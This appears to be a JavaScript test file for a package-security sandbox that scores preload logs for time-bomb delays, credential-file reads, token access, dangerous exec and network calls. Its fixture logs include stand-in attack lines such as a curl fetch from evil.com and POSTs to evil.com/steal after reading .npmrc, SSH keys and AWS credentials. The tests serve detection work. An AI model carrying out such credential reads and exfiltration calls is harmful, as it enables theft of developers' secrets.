const fs = require('fs');
const path = require('path');
const os = require('os');
const vm = require('vm');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  addSkipped
} = require('../test-utils');

function runPreloadTests() {
  console.log('\n=== PRELOAD UNIT TESTS ===\n');

  // ============================================
  // ANALYZER TESTS
  // ============================================

  const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');

  test('PRELOAD-ANALYZER: empty input returns score 0', () => {
    const result = analyzePreloadLog('');
    assert(result.score === 0, 'Empty log should score 0, got ' + result.score);
    assert(result.findings.length === 0, 'Should have no findings');
  });

  test('PRELOAD-ANALYZER: null input returns score 0', () => {
    const result = analyzePreloadLog(null);
    assert(result.score === 0, 'Null should score 0');
  });

  test('PRELOAD-ANALYZER: undefined input returns score 0', () => {
    const result = analyzePreloadLog(undefined);
    assert(result.score === 0, 'Undefined should score 0');
  });

  test('PRELOAD-ANALYZER: timer delay > 1h scores MEDIUM', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 15, 'Timer > 1h should score 15, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_timer_delay_suspicious', 'Type should be sandbox_timer_delay_suspicious');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
  });

  test('PRELOAD-ANALYZER: timer delay > 24h scores CRITICAL and supersedes suspicious', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Timer > 24h should score 30, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical only)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Type should be sandbox_timer_delay_critical');
    assert(result.findings[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
  });

  test('PRELOAD-ANALYZER: both 1h and 24h timers — critical supersedes suspicious', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Should only score 30 (critical only), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical supersedes suspicious)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Should be critical type');
  });

  test('PRELOAD-ANALYZER: timer delay < 1h not scored', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=500ms (0.0h) forced to 0 (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Timer < 1h should score 0, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: sensitive file read scores HIGH', () => {
    const log = '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 20, 'Sensitive read should score 20, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_preload_sensitive_read', 'Type should be sandbox_preload_sensitive_read');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-sensitive file read not scored', () => {
    const log = '[PRELOAD] FS_READ: /usr/lib/node_modules/npm/package.json (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-sensitive read should score 0');
  });

  test('PRELOAD-ANALYZER: network after sensitive read scores CRITICAL', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+200ms)\n';
    const result = analyzePreloadLog(log);
    // Should have: sensitive read (20) + network after sensitive read (40) = 60
    assert(result.score === 60, 'Sensitive read + network should score 60, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should have sensitive read finding');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should have network after read finding');
  });

  test('PRELOAD-ANALYZER: network WITHOUT sensitive read does not trigger compound', () => {
    const log = '[PRELOAD] NETWORK: https.request GET npmjs.org/pkg (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Network alone should score 0');
    assert(result.findings.length === 0, 'No findings for network alone');
  });

  test('PRELOAD-ANALYZER: dangerous exec scores HIGH', () => {
    const log = '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com/payload (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 25, 'Dangerous exec should score 25, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_exec_suspicious', 'Type should be sandbox_exec_suspicious');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-dangerous exec not scored', () => {
    const log = '[PRELOAD] EXEC: exec: node index.js (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-dangerous exec should score 0');
  });

  test('PRELOAD-ANALYZER: env token access scores MEDIUM', () => {
    const log =
      '[PRELOAD] ENV_ACCESS: GITHUB_TOKEN (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 10, 'Env access should score 10, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_env_token_access', 'Type should be sandbox_env_token_access');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
    assertIncludes(result.findings[0].detail, 'GITHUB_TOKEN', 'Should mention GITHUB_TOKEN');
    assertIncludes(result.findings[0].detail, 'NPM_TOKEN', 'Should mention NPM_TOKEN');
  });

  test('PRELOAD-ANALYZER: combined findings cap at 100', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+10ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+20ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+30ms)\n' +
      '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com (t+40ms)\n' +
      '[PRELOAD] ENV_ACCESS: AWS_SECRET_ACCESS_KEY (t+50ms)\n';
    const result = analyzePreloadLog(log);
    // timer(30) + sensitive_read(20) + network_after_read(40) + exec(25) + env(10) = 125 -> capped at 100
    assert(result.score === 100, 'Combined score should cap at 100, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: full time-bomb scenario', () => {
    const log =
      '[PRELOAD] INIT: Preload active. TIME_OFFSET=259200000ms (72.0h). PID=1 (t+0ms)\n' +
      '[PRELOAD] TIME: Time offset applied: +259200000ms (72.0h) (t+0ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+50ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+150ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/exfil (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score >= 80, 'Time-bomb scenario should score >= 80, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_timer_delay_critical'), 'Should detect critical timer');
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should detect sensitive read');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should detect network after read');
    assert(types.includes('sandbox_env_token_access'), 'Should detect env access');
  });

  test('PRELOAD-ANALYZER: ignores non-PRELOAD lines', () => {
    const log =
      'Some random npm output\n' +
      'npm WARN deprecated\n' +
      '[SANDBOX] Installing pkg...\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-PRELOAD lines should score 0');
  });

  test('PRELOAD-ANALYZER: multiple sensitive file reads counted once', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.ssh/id_rsa (t+200ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.aws/credentials (t+300ms)\n';
    const result = analyzePreloadLog(log);
    // Only one sensitive_read finding, score 20
    assert(result.score === 20, 'Multiple sensitive reads should score 20 (once), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding for all reads');
    assertIncludes(result.findings[0].evidence, '.npmrc', 'Should list .npmrc');
    assertIncludes(result.findings[0].evidence, '.ssh', 'Should list .ssh');
  });

  // ============================================
  // PRELOAD SCRIPT TESTS (vm isolation)
  // ============================================

  console.log('\n=== PRELOAD SCRIPT TESTS ===\n');

  test('PRELOAD: preload.js file exists and is syntactically valid', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    assert(fs.existsSync(preloadPath), 'docker/preload.js should exist');
    const code = fs.readFileSync(preloadPath, 'utf8');
    // Should be a valid JavaScript IIFE
    assert(code.includes('(function'), 'Should be an IIFE');
    assert(code.trim().endsWith('})();'), 'Should end with IIFE invocation');
    // Verify it parses
    new vm.Script(code); // Throws if syntax error
  });

  test('PRELOAD: preload.js contains all required patches', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    assertIncludes(code, 'Date.now', 'Should patch Date.now');
    assertIncludes(code, 'setTimeout', 'Should patch setTimeout');
    assertIncludes(code, 'setInterval', 'Should patch setInterval');
    assertIncludes(code, 'MUADDIB_TIME_OFFSET_MS', 'Should read TIME_OFFSET env var');
    assertIncludes(code, 'appendFileSync', 'Should use appendFileSync for logging');
    assertIncludes(code, '[PRELOAD]', 'Should use [PRELOAD] log prefix');
    assertIncludes(code, '/tmp/preload.log', 'Should log to /tmp/preload.log');
    assertIncludes(code, 'process.env', 'Should intercept process.env');
    assertIncludes(code, 'child_process', 'Should intercept child_process');
    assertIncludes(code, 'SENSITIVE_RE', 'Should have sensitive file regex');
    assertIncludes(code, 'DANGEROUS_CMD_RE', 'Should have dangerous command regex');
  });

  test('PRELOAD: preload.js saves originals in closure', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    assertIncludes(code, '_DateNow', 'Should save original Date.now');
    assertIncludes(code, '_setTimeout', 'Should save original setTimeout');
    assertIncludes(code, '_setInterval', 'Should save original setInterval');
    assertIncludes(code, '_appendFileSync', 'Should save original appendFileSync');
    assertIncludes(code, '_fs', 'Should save original fs');
  });

  test('PRELOAD: preload.js wraps patches in try/catch', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    // Count try blocks — should have many for safety
    const tryCount = (code.match(/\btry\s*\{/g) || []).length;
    assert(tryCount >= 10, 'Should have at least 10 try blocks for safety, got ' + tryCount);
  });

  // ============================================
  // SANDBOX MODULE INTEGRATION TESTS
  // ============================================

  console.log('\n=== SANDBOX MODULE TESTS ===\n');

  const { analyzePreloadLog: sboxAnalyze, TIME_OFFSETS } = require('../../src/sandbox/index.js');

  test('PRELOAD-MODULE: analyzePreloadLog is re-exported from sandbox/index.js', () => {
    assert(typeof sboxAnalyze === 'function', 'Should be a function');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS has 3 entries', () => {
    assert(Array.isArray(TIME_OFFSETS), 'TIME_OFFSETS should be an array');
    assert(TIME_OFFSETS.length === 3, 'Should have 3 time offsets, got ' + TIME_OFFSETS.length);
    assert(TIME_OFFSETS[0].offset === 0, 'First offset should be 0');
    assert(TIME_OFFSETS[1].offset === 259200000, 'Second offset should be 72h');
    assert(TIME_OFFSETS[2].offset === 604800000, 'Third offset should be 7d');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS have labels', () => {
    for (const entry of TIME_OFFSETS) {
      assert(typeof entry.label === 'string' && entry.label.length > 0, 'Each offset should have a label');
    }
  });

  // ============================================
  // RULES AND PLAYBOOKS
  // ============================================

  console.log('\n=== PRELOAD RULES & PLAYBOOKS ===\n');

  const { getRule } = require('../../src/rules/index.js');
  const { getPlaybook } = require('../../src/response/playbooks.js');

  const preloadRuleTypes = [
    'sandbox_timer_delay_suspicious',
    'sandbox_timer_delay_critical',
    'sandbox_preload_sensitive_read',
    'sandbox_network_after_sensitive_read',
    'sandbox_exec_suspicious',
    'sandbox_env_token_access'
  ];

  for (const type of preloadRuleTypes) {
    test(`PRELOAD-RULE: Rule exists for ${type}`, () => {
      const rule = getRule(type);
      assert(rule.id.startsWith('MUADDIB-SANDBOX-'), `Rule ${type} should have MUADDIB-SANDBOX- ID, got ${rule.id}`);
      assert(typeof rule.severity === 'string', 'Should have severity');
      assert(typeof rule.mitre === 'string', 'Should have MITRE mapping');
    });

    test(`PRELOAD-PLAYBOOK: Playbook exists for ${type}`, () => {
      const playbook = getPlaybook(type);
      assert(playbook !== 'Analyser manuellement cette menace.', `Playbook for ${type} should not be default`);
      assert(playbook.length > 20, 'Playbook should have meaningful content');
    });
  }
}

module.exports = { runPreloadTests };
